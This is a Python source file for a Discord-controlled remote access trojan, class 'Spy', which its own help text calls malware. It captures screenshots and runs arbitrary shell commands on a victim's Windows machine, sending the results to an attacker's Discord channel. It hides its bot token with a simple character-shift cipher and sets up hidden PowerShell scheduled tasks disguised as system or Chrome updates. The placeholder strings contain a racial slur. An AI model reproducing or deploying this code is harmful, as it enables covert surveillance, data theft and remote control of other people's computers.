import nextcord
from nextcord.ext import commands
import os, shutil
from pyautogui import screenshot
from asyncio import create_subprocess_shell, subprocess


class Spy:
    Bot = commands.Bot(intents=nextcord.Intents.all(), command_prefix='!')
    EncryptStep = 2
    Channel = None
    ChannelID = None
    Target = os.environ['USERPROFILE']
    Root = os.path.dirname(os.path.abspath(__file__))


    @staticmethod
    def Decrypt(string) -> str:
        return ''.join([chr(ord(c)-Spy.EncryptStep) for c in str(string)])

    @staticmethod
    def Run() -> None:
        Spy.ChannelID = int(Spy.Decrypt("nigga"))
        
        Spy.Bot.run(Spy.Decrypt("aintshowingmytokennigga"))

    @staticmethod
    async def Debug(msg) -> None:
        await Spy.Channel.send(f'```{msg}```')

    @staticmethod
    async def RunCommand(command) -> tuple:
        proc = await create_subprocess_shell(
            command, 
            shell=1, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        return tuple(map(lambda x: x.decode('utf-8').strip(), await proc.communicate()))

    @Bot.event
    async def on_ready():
        Spy.Channel = Spy.Bot.get_channel(Spy.ChannelID)
        await Spy.Channel.send(f'`Bot running from: {Spy.Target}`')

    @Bot.command(help="Get bot status")
    async def status(ctx) -> None:
        await Spy.Debug(f"Target: {Spy.Target}\nStatus: On")

    @Bot.command(help="Get screenshot of computer screen")
    async def screenshot(ctx) -> None:
        path = f"{Spy.Root}\\screenshot.png"
        screenshot().save(path)
        await Spy.Channel.send(file=nextcord.File(path))
        os.remove(path)

    @Bot.command(help="Send command to computer")
    async def cmd(ctx, *, args) -> None:
        content = '\n\n'.join(await Spy.RunCommand(args)).strip() or "No output"
        
        if len(content)>2000:
            path = "log.txt"
            with open(path, "w") as f:
                f.write(content)
            await Spy.Channel.send(file=nextcord.File(path))
            os.remove(path)
        else:
            await Spy.Debug(content)

    @Bot.command(help="Halt and delete malware")
    async def wipe(ctx) -> None:
        path = f'{Spy.Target}\\.system'

        try:
            if os.path.exists(path):
                shutil.rmtree(path)
                msg = f"{path} deleted successfully"
            else:
                msg = f"{path} does not exist"
        except:
            msg = f"Failed to delete {path}"
        
        await Spy.Debug(msg)

        for i in ["Win32Installer", "ChromeUpdate"]:
            _, err = await Spy.RunCommand(f"schtasks /delete /tn {i} /f")
            await Spy.Debug("Failed to delete task" if err else f"{i} task deleted successfully")

        try:
            file = "sys.ps1"
            dest = f"{Spy.Target}/{file}"

            if os.path.exists(dest):
                os.remove(dest)
            shutil.move(file, dest)

            await Spy.RunCommand(f'''schtasks /create /tn "SystemClock" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"{dest}\"" /sc minute /mo 1 /st 00:00:00 /f > nul 2> nul''')
            await Spy.Debug("Successfully scheduled .settings delete")
        except Exception:
            await Spy.Debug(f"Failed to schedule .settings delete")
        
        await Spy.Bot.close()
